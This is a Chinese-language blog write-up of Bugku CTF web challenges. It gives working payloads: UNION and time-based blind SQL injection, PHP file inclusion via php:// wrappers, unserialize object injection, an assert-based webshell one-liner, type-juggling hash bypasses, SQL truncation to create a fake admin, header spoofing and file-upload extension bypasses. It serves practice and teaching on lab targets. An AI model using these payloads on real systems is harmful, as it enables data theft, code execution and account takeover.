---
title: bugku writeup
author: ch4ser
date: 2019-04-22 04:13:30
categories:
  - CTF
typora-root-url: ../
cover:
  image: image-20211114140949068.png
---

> 纪念那段岁月

## web3

网站里面循环弹出提示框，用chrome的开发者工具打开一片空白，
用ctrl+u查看源代码，发现一串

```
  <!--&#75;&#69;&#89;&#123;&#74;&#50;&#115;
  &#97;&#52;&#50;&#97;&#104;&#74;&#75;&#45;
  &#72;&#83;&#49;&#49;&#73;&#73;&#73;&#125;-->
```
这是unicode，转码即可

## 你必须让他停下来！

查看源代码竟然直接有flag了，网上的解法是抓包

## 本地包含

解法:利用hellow构造payload
$_REQUEST：默认情况下包含了 $_GET，$_POST 和 $_COOKIE 的数组。
var_dump():此函数显示有关包含其类型和值的一个或多个表达式的结构化信息。
递归地探索数组和对象，其中值缩进以显示结构。在这题里面只是显示变量的类型，对
eval并无影响，对于eval来说，和eval（$a）是一样的。

  payload：/index.php?hello = show_source('flag.php')
  网上的payload：/index.php?hello=1);show_source('flag.php');var_dump(

## 域名解析

编辑etc/hosts添加一条123.206.87.240	 flag.bugku.com，
在浏览器中打开flag.bugku.com即可得到flag。

反思：host请求头是http1.1添加的东西，
添加域名解析之后直接访问123.206.87.240却显示403，也就是说在https下主机名必不可少。

添加host之前访问ip地址结果显示错误400（缺少host）
添加host之后访问ip地址结果显示错误403（读取访问被禁）

## 你必须让他停下

使用burpsuite的repeater功能进行抓包操作，
通过多次点击go，最终发现在原先是“flag is here”的位置出现了flag

## 变量1

函数知识：
  isset（）判断是否有输入
  pre_match是正则表达式，引号中的内容都以/^开头，以$/结尾，\w+的意思是0~9 a~z A~Z，
  输入的内容被限定了，所以不能输入代码

输入arg=GLOBALS，从代码中可知会给GLOBALS再套上一个$，就输出了flag

## Web5

查看源代码，发现jother编码，打开控制台输入就行了

## 头等舱

打开网页显示什么都没有，查看源代码也什么都没有，打开控制台重新加载看头文件，什么也没有，
点击显示头文件源代码，显示flag（注释形式）



## 网站被黑

扫描端口

发现登陆界面

然后用burpsuite的intruder功能破解

## 管理员系统

实在没有头绪，上网查说这是X-Forwarded-For:简称XFF头，它代表客户端，
也就是HTTP的请求端真实的IP，只有在通过了HTTP 代理或者负载均衡服务器时才会添加该项。
也就是第一次发送的时候会记录本主机的ip，之后每次经过一个代理，
都会在尾部添加一个代理的ip，
X-Forwarded-For可以显示完整的传输路径和恶意攻击来源但是X-Forward-For可以被伪造。题目中说联系本地管理员，那就设置X-Forwarded-For为代表本地访问的127.0.0.1。
同时查看网页源代码发现，有一串注释，查到说是base64编码，
特征是结尾以一个或者两个=结束，解码后得到密码，输入后使用burpsuite进行拦截，
添加X-Forwarded-For：127。0.0.1后发送，得到了flag

参考资料：ctf中常见的编码格式： https://www.cnblogs.com/gwind/p/7997922.html

## web4

查看源代码，发现一串url编码的东西，
Eval函数会将里面的内容作为代码执行，unescape将其解码。要解码：
```python
import urllib
a = '%66%75%6e%63%74%69%6f%6e%20%63%68%65%63%6b%53%75%62%6d%69%74
%28%29%7b%76%61%72%20%61%3d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c
%65%6d%65%6e%74%42%79%49%64%28%22%70%61%73%73%77%6f%72%64%22%29%
3b%69%66%28%22%75%6e%64%65%66%69%6e%65%64%22%21%3d%74%79%70
%65%6f%66%20%61%29%7b%69%66%28%22%36%37%64%37%30%39%62%32%62'

b = '%61%61%36%34%38%63%66%36%65%38%37%61%37%31%31%34%66%31%22%3d
%3d%61%2e%76%61%6c%75%65%29%72%65%74%75%72%6e%21%30%3b%61%6c%65%72
%74%28%22%45%72%72%6f%72%22%29%3b%61%2e%66%6f%63%75%73%28%29%3b%72
%65%74%75%72%6e%21%31%7d%7d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45
%6c%65%6d%65%6e%74%42%79%49%64%28%22%6c%65%76%65%6c%51%75
%65%73%74%22%29%2e%6f%6e%73%75%62%6d%69%74%3d%63%68%65%63%6b%53%75%62%6d%69%74%3b'

print urllib.unquote(a+b)
```

得到代码如下：

```php
function checkSubmit()
{
var a=document.getElementById("password");
if("undefined"!=typeof a)
{
if("67d709b2b54aa2aa648cf6e87a7114f1"==a.value)return!0;
  alert("Error");
  a.focus();
  return!1}
}
document.getElementById("levelQuest").onsubmit=checkSubmit;
```

可以看出这里已经暴露了password，返回输入即可。

## flag在index里面

点击链接，看url：file=show.Php，参数file是关键，
本地包含(include)：file=php：//filter/read=convert.base64-encode/resource=index.php,

有关于这些协议的内容要好好看看

## 输入密码得到flag
用burpsuite直接打

## 点击一百万次

  使用hackbar使用post动作：click = 1000001就得到了flag

## 备份是个好习惯

### 知识点补充

  $_SEVRER函数
  ```php
  <?php
  $SERVER["$QUERY_STRING"]
  //获取查询语句也就是？之后的内容

  $SERBER["REQUEST_URI"]
  //用来获取URL中的路径地址部分（不是url！）例如：http://www.hujuntao.com/index.php?p=3
  //$_SERVER['REQUEST_URI']获得的就是/index.php?p=3这部分

  $_SERVER["HTTP_X_REWRITE_URL"]
  //在IIS下功能同上，在apache环境下显示为空

  $SERVER["SCRIPT_NAME"]
  //获取当前脚本的路径，比如“/aaa/index.php”

  $_SERVER["PHP_SELF"]
  //正在执行的脚本名，比如“/aaa/index.php”

  ```

  str function

  ```php
  <?php
  strstr($_SERVER['REQUEST_URI'], '?')
  //return the string after '?' (include '?')

  substr($str,1)
  //return the string after the first symbol

  str_replace('key','',$str)
  //replace the 'key' in str to ''

  parse_str($str)
  //parse the str

  for example:

      $str = "first=value&arr[]=foo+bar&arr[]=baz";

      // 推荐用法
      parse_str($str, $output);
      echo $output['first'];  // value
      echo $output['arr'][0]; // foo bar
      echo $output['arr'][1]; // baz

      // 不建议这么用
      parse_str($str);
      echo $first;  // value
      echo $arr[0]; // foo bar
      echo $arr[1]; // baz

  ```
  回到bugku题目：备份是个好习惯

  打开界面发现只有一串字符串
  搜索index.php.bak可以看到源码：

  ```PHP
  <?php
  /**
   * Created by PhpStorm.
   * User: Norse
   * Date: 2017/8/6
   * Time: 20:22
  */

  include_once "flag.php";
  ini_set("display_errors", 0);
  $str = strstr($_SERVER['REQUEST_URI'], '?');//get string before "?"
  $str = substr($str,1);                      //get string after the second symbol
  $str = str_replace('key','',$str);          //replace 'key' to '' in str
  parse_str($str);
  echo md5($key1);

  echo md5($key2);
  if(md5($key1) == md5($key2) && $key1 !== $key2){
      echo $flag."取得flag";
  }
  ?>
  ```

  然后分析构造payload，这里有一个知识点，用MD5加密的过程中，如果两个字符经MD5加密后的值为 0exxxxx形式，就会被认为是科学计数法，且表示的是0*10的xxxx次方，还是零，都是相等的。

  下列的字符串的MD5值都是0e开头的数字：

  QNKCDZO

  240610708

  s878926199a

  s155964671a

  s214587387a

比较md5(username),md5(password),md5(code)类型和值，双等于存在漏洞的原因其实是，0E开头的MD5值php解析器会解析为numerical strings，在双等于（==）情况下，会先判断类型，识别为numerical strings，会强制转换为数字，所以0e开头的MD5值都为0，所以才能绕过，然而三等于就比较有脾气了，必须一对一的核对两个字符串，不存在什么类型转换问题，所以开头0e相同，后面不同，也就不满足了


  所以构造payload：
  ```html
  index.php?kkey1=QNKCDZO&kkey2=240610708
  ```
  按下回车就得到了flag

  另：有一个扫描查看源码泄露的脚本，使用指南和下载地址如下：
  https://coding.net/u/yihangwang/p/SourceLeakHacker/git?public=true

  ## 成绩单

  判断是数据库的问题，一开始犯蠢在url框里面写payload。。。。
根据昨天所学的知识，我们先输入1，可以输出成绩单。然后输入1’发现失败，
在尾部添加一个#又可以正常显示了。Emmmm。。。然后由于成绩单里面有三个列，
所以从3开始试试看看到底有几个列。。。。
最终在输入-1’ union select 1,2,3,4#的时候能够显示出内容，由此确定了有四列。

这个地方有点迷：同样是post形式，
在查询框里面输入1’#就可以但是在hackbar里面写id=1‘#就不行，
然而用id=1也是可以正常显示的。。。这个地方很是让我困惑，
后来的payload也是在查询框里面写的。
第二个问题是，同样是注释，为啥#就可以起作用但是--+就不行，
考虑到题目的类型（水题），感觉不太可能是过滤掉了。。。很迷。。。。

已解决：--+的‘+’的意思是url中的空格，真实的注释仅仅是--

做完这一切后就可以开始了：
首先是查到所有数据库的名字
-1’ union select 1,2,group_concat(schema_name),4 from information_schema.schemata#  得到了数据库名字有一个叫做skctf_flag的
接下来，通过数据库名字查找表名
-1’ union select 1,2,group_concat(table_name),4 from information_schema.tables where table_schema=’skctf_flag’#		得到了一个叫做fl4g的一个表
接下来通过表明找列名
-1’ union select 1,2,group_concat(column_name),4 from information_schema.columns where table_name=’fl4g’# 得到了一个列名字叫做skctf_flag
最后通过列名找到内容
-1’union select 2,3,group_concat(skctf_flag),4 from skctf_flag.fl4g#
得到flag


## cookie欺骗

看到网址里面filename后面是base64编码的东西，尝试解码看到是keys.txt
改成index.php试一试，然后这里有一个line参数，随便输个1什么的，可以看到有php代码返回
（有一个困惑就是输入0不返回最开始的<?php）然后构造低端脚本：

```python
import requests

#http://123.206.87.240:8002/web11/index.php?line=&filename=aW5kZXgucGhw

url1 = 'http://123.206.87.240:8002/web11/index.php?line='
url2 = '&filename=aW5kZXgucGhw'

for para in range(0,20):
    url = url1 + repr(para) + url2
    print(requests.get(url).content)
```

得到了以下代码
```PHP
<?php
error_reporting(0);
$file=base64_decode(isset($_GET['filename'])?$_GET['filename']:"");
$line=isset($_GET['line'])?intval($_GET['line']):0;//这里应该是base进制转换，line为空的话默认设置为0
if($file=='') header("location:index.php?line=&filename=a2V5cy50eHQ=");
$file_list = array(
'0' =>'keys.txt',
'1' =>'index.php',
);

if(isset($_COOKIE['margin']) && $_COOKIE['margin']=='margin'){
$file_list[2]='keys.php';
}

if(in_array($file, $file_list)){
$fa = file($file);//应该是打开文件的意思，文件应该是在同级目录下
echo $fa[$line];
}
?>
```
然后这是别人的获取代码脚本：

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
import requests
s=requests.Session()
url='http://120.24.86.145:8002/web11/index.php'
for i in range(1,20):
    payload={'line':str(i),'filename':'aW5kZXgucGhw'}
    a=s.get(url,params=payload).content
    content=str(a,encoding="utf-8")
    print(content)
```
嗯人家的正规很多啊

然后这里就是要post一个cookie，其中的参数是margin=margin,而且要把filename设置为
keys.php的base64编码形式。这个就在burpsuite中操作：


## bugku--insert into

the injection point is as follows:

> $sql="insert into client_ip (ip) values ('$ip')";

the $ip comes from "x-forwarded-for"

and before this code, the symbol ',' has been filtered in our input;

payload are as followed:

```sql
  127.0.0.1+(select case when substr((select flag from flag) from 1 for 1)='C' then sleep(5) else 0 end)-- +
```

>the '+' on the tail is not for annotation,instead it exists for the blank space before
,because the posted data's last space will be ignored ,but adding another symbol after the space
can avoid it.

## never give up

查看源代码，看见注释`<!--1p.html-->`

修改url，进入的是ctf的主页，在viewsource中修改代码，得到了另一个网页的源代码，查找得到
可能是重定向。

```html

<HTML>
<HEAD>
<SCRIPT LANGUAGE="Javascript">
<!--


var Words ="%3Cscript%3Ewindow.location.href%3D%27http%3A//www.bugku.com%27%3B%3C/script%3E%20%0A
%3C%21--JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI
3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCU
zRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQ
lNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0Q
lMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI
5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTN
CJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW5
0cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyU
yMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3R
ybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJ
DMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTI
xJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCU
wQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB
1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ%3D%3D--%3E"
function OutWord()
{
var NewWords;
NewWords = unescape(Words);//unescape()函数可对通过 escape()编码的字符串进行解码。
//该函数的工作原理是这样的：通过找到形式为 %xx 和 %uxxxx 的字符序列（x 表示十六进制的数字），
//用 Unicode 字符 \u00xx 和 \uxxxx 替换这样的字符序列进行解码。
document.write(NewWords);
//把东西直接写道html页面里面
}
OutWord();
// -->

</SCRIPT>
</HEAD>
<BODY>
</BODY>
</HTML>
```

那个一大串的东西是url编码的东西（观察到开头和结尾部分可能是一对注释的头尾）。
在python中解码如下：

```python
import urllib
a="%3C%21--JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI
3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCU
zRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQ
lNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0Q
lMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI
5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTN
CJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW5
0cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyU
yMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3R
ybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJ
DMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTI
xJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCU
wQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB
1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ%3D%3D--%3E"

print urllib.unquote(a)

```
这里面出来的是base64编码的东西，解码得到

```php
";if(!$_GET['id'])

        header('Location: hello.php?id=1');
        exit();
}
$id=$_GET['id'];
$a=$_GET['a'];
$b=$_GET['b'];
if(stripos($a,'.'))

        echo 'no no no no no no no';
        return ;
}
$data = @file_get_contents($a,'r');//file_get_contents - 将整个文件读入字符串
if($data=="bugku is a nice plateform!" and $id==0 and strlen($b)>5 and eregi("111".substr($b,0,1),"1114") and substr($b,0,1)!=4)
//eregi是正则匹配函数
        require("f4l2a3g.txt");
}
else

        print "never never never give up !!!";
}
?>
```

 其实直接在url里面写一个f4l2a3g.txt就可以得到flag了

 - 正解如下：

 题目的意思是要满足以下条件：

 - id不等于0
 - id弱等于0，那么查看php的表格发现字符串弱等于0，所以让id=“ijk”
 - b的第一个字符不等于4，又要让“111”.substr(b,0,1)和“1114”匹配起来。eregi函数可以用截断字符\x00绕过
    但是注意在输入url的时候\x00会被转码，导致url被截断。注意，虽然 b=%0012345 实际字符串长度为 8 字节，
    但在后台脚本读入数据时，会将 URL 编码 %00 转换成 1 字节。所以说，空字符应该在后台脚本的变量中出现，
    而不是在 URL 查询字符串变量中出现。

- $data 是由 file_get_contents() 函数读取变量 $a 的值而得，所以 $a 的值必须为数据流。
  在服务器中自定义一个内容为 bugku is a nice plateform! 文件，再把此文件路径赋值给 $a，显然不太现实。
  伪协议 php:// 来访问输入输出的数据流，其中 php://input 可以访问原始请求数据中的只读流。

所以构造如下：

    id="int"&b=%0012345&a=php://input 并在burp的请求头中添加bugku is a nice plateform!

## welcome to the bugkuctf

进入源代码界面，file_get_contents说明得是数据流，看到hint.php,然后再检索框里面输入：

    index.php?txt=php://input&file=hint.php
    并且在burpsuite中添加welcome to thebugkuctf
得到的只是hint.php的效果界面，要看到hint的源码，要这样输入

    index.php?txt=php://input&file=php://filter/read=convert.base64-encode/resource=hint.php

  输出一堆base64编码，解码得到

  ```php
  <?php

class Flag{//flag.php
    public $file;
    public function __tostring(){
        if(isset($this->file)){
            echo file_get_contents($this->file);
                        echo "<br>";
                return ("good");
        }
    }
}
?>
  ```

同样的道理，使用
index.php?txt=php://input&file=php://filter/read=convert.base64-encode/resource=index.php

解码得到了index.php的源代码。

```php
<?php
$txt = $_GET["txt"];
$file = $_GET["file"];
$password = $_GET["password"];

if(isset($txt)&&(file_get_contents($txt,'r')==="welcome to the bugkuctf")){
    echo "hello friend!<br>";
    if(preg_match("/flag/",$file)){
                echo "不能现在就给你flag哦";
        exit();
    }else{
        include($file);
        $password = unserialize($password);
        echo $password;
    }
}else{
    echo "you are not the number of bugku ! ";
}

?>

<!--
$user = $_GET["txt"];
$file = $_GET["file"];
$pass = $_GET["password"];

if(isset($user)&&(file_get_contents($user,'r')==="welcome to the bugkuctf")){
    echo "hello admin!<br>";
    include($file); //hint.php
}else{
    echo "you are not admin ! ";
}
 -->
```

 显然这里不让我们再file中输入flag文件名。但是Flag类在构造对象的时候会执行构造函数，这个时候
 有机会echo出我们要的文件。但是要怎么利用password来传入我们要的对象呢？看到了unseialize反序列函数
 这个函数可以把对象从序列化的字符串还原出对象来.在PHP中,序列化用于存储或传递*PHP 的值*的过程中,同时不丢失其类型和结构

 所以我们编写如下代码：
```php
<?php
Class Flag{
  public $file='flag.php'
}
$a = new Flag;
echo serialize($a);

?>
```

输出O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}

于是传入参数index.php?txt=welcome to the bugkuctf&file=hint.php&password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}

得到flag

## 过狗一句话

刚开始给我们的php代码：

```php
<?php $poc="a#s#s#e#r#t";
$poc_1=explode("#",$poc);
$poc_2=$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5]; $poc_2($_GET['s'])
?>
```

看意思explode就是根据第一参数的规则将目标划分为一个数组。那么pro2就是assert的意思
assert（）一个东西，如果字符串会被当做代码执行，否则是false

以下解法
    试探一下：?index.php?s=phpinfo();//可以正常执行
    ?index.php?s=print_r(scandir(./)) //./的意思应该是在当前目录下，scan扫描目录文件返回一个数组

    显示了flag所处的txt文件夹，之后用var_dump()或者show_source()或者直接访问都可以

## 字符？正则？

打开网页，要求匹配的正则式子如下：

      /key.*key.{4,7}key:\/.\/(.*key)[a-z][[:punct:]]/i

- /。。。。/这对东西标志正则表达式的开头和结尾，类似的还有#。。。#等
- [[:punct:]] ：匹配任何标点符号；
- /i  ：表示这个正则表达式对大小写不敏感；
  一开始我写的匹配对象是这样的：

      http://123.206.87.240:8002/web10/?id=keykey00000key://keyb.

但是失败原因是在最后两个斜杠上，他们在url输入的时候前一个会充当转义作用，实际输入的只有一个/
变成这样就好了：

      http://123.206.87.240:8002/web10/?id=keykey00000key:///keyb.

## 前女友

打开源代码，发现在链接处有个链接，点进入是php代码

```php
<?php
if(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){
    $v1 = $_GET['v1'];
    $v2 = $_GET['v2'];
    $v3 = $_GET['v3'];
    if($v1 != $v2 && md5($v1) == md5($v2)){
        if(!strcmp($v3, $flag)){
            echo $flag;
        }
    }
}
?>
```

对于这里的md5，既可以采用md5碰撞的方法，也可以让两个变量都在输入的时候声明为数组得到false=false
，对于这里的strcmp可以试试把v3声明为一个不符合数据类型的东西比如说整数，这样可以让函数返回0(仅对php5.3之前版本有效)

    http://123.206.31.85:49162/index.php?v1=s878926199a&v2=s155964671a&v3[]=1
    
    或者
    
    http://123.206.31.85:49162/index.php?v1[]=1&v2[]=2&v3[]=1

## login1

打开之后是登陆界面，提示说是sql约束攻击，具体博客教程看这里[sql约束攻击](https://blog.csdn.net/wy_97/article/details/77972375)


总而言之为了创建一个新的admin，我们注册以下账户：

    username：admin                                            1
    password：2017zxwlB


- 注册的时候，会首先查看是否有相同的用户名，但是因为select查询语句并不对超出最大长度限
制的检索对象进行尾部修剪，所以在这种情况下，我们注册的用户名在数据库中并不存在。

- 既然不存在，就会向表中插入这条新的用户数据，但是由于超出了varchar()所规定的长度，所以
超出部分会被截断，这是第一重处理，接下来数据库会把有效字符后面的空格都删掉，这是第二重处理
由此我们插入了一个admin用户，使用的是自己的密码就可以登陆

登陆就好了。

## 你从哪里来

题目说 你是从谷歌来的吗？，在burpsuite中添加referer:https://www.google.com就可以了

## md5 collision

从历史write up中记录的转化后的值为0的md5码中选两个出来作为参数就可以了

## 程序员本地网站

要求从本地访问，在burpsuite中添加一条x-forwarded-for:127.0.0.1就可以了！

## 各种绕过

打开网页之后看到的代码如下

```php
<?php
highlight_file('flag.php');
$_GET['id'] = urldecode($_GET['id']);
$flag = 'flag{xxxxxxxxxxxxxxxxxx}';
if (isset($_GET['uname']) and isset($_POST['passwd'])) {
   if ($_GET['uname'] == $_POST['passwd'])

       print 'passwd can not be uname.';

   else if (sha1($_GET['uname']) === sha1($_POST['passwd'])&($_GET['id']=='margin'))

       die('Flag: '.$flag);

   else

       print 'sorry!';

}
?>
```

sha1是散列算法函数，返回散列值。这里传入两个不符合数据类型的数据来让两个都返回false就可以做到相等
，那么就让uname声明成为一个数组，并且用hackbar传一个数组类型的passwd进去。id=margin就行了。

## web8

打开网站显示代码

```php
<?php
extract($_GET);//解析所有通过get方式获取的变量
if (!empty($ac))
{
$f = trim(file_get_contents($fn));//从打开fn所代表的文件，或者是文件流
if ($ac === $f)//强等于
{
echo "<p>This is flag:" ." $flag</p>";
}
else
{
echo "<p>sorry!</p>";
}
}
?>
```
可知有两种解法：

- 解法一：利用php://input传入fn一个值并让他和ac相等(这里很奇怪我的hackbar不能给php://input传数据，但是burpsuite应该可以)

- 解法二：根据题目提示，猜测有flag.txt在同级目录下，访问之看到文件内容显示flags，
那么让ac=flags，fn=flag.txt就可以得到flag了。

## 细心

使用御剑软件扫描网站，发现有robots.txt,点进去显示

    User-agent: *
    Disallow: /resusl.php

访问这个php文件试试，看到了显示里头警告不是管理员登陆，自己的ip已经被记录，第一反应是伪造本地访问

    Host: 127.0.0.1
    Referer: 127.0.0.1
    X-Forwarded-For: 127.0.0.1
    Client-IP: 127.0.0.1
    X-Remote-IP: 127.0.0.1
    X-Originating-IP: 127.0.0.1
    X-Remote-Addr: 127.0.0.1

这几种方式都可以在burpsuite中进行修改来伪造本地访问。(但是题目的考点似乎并不在此)

接下来显示

    By bugkuctf.
    
    if ($_GET[x]==$password) 此处省略1w字

试一试把x赋值成admin试一试？刚开始题目的文字信息就让我们试试构造了admin，果然有了flag

    robots.txt是一个纯文本文件，在这个文件中网站管理者可以声明该网站中不想被搜索引擎访
    问的部分，或者指定搜索引擎只收录指定的内容。
    当一个搜索引擎（又称搜索机器人或蜘蛛程序）访问一个站点时器人就会按照该文件中的内容来
    确定访问的范围；如果该文件不存在，那么搜索机器人就沿着链接抓取。

## 求getshell（文件上传类型）

打开页面，要求发送图片文件而不是php文件。看网上说是黑名单过滤和类型检测，但是可以把
content-type 进行大小写绕过和类型修改，并且修改php文件的后缀名，可以修改成以下几种

        php2, php3, php4, php5, phps, pht, phtm, phtml

试了以上几种之后，php5可以拿到flag。
